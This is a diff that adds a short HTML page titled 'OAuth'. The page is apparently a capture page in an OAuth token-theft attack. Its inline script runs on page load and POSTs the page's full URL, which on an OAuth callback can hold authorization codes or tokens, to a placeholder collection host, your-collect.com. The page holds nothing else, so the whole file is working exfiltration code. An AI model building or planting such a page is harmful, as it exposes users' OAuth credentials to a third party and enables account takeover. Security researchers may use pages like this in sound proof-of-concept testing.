@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>OAuth</title></head>
+<body>
+<script>
+  (function () {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://your-collect.com/endpoint", true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(JSON.stringify({ location: location.href }));
+  })();
+</script>
+</body>
+</html>
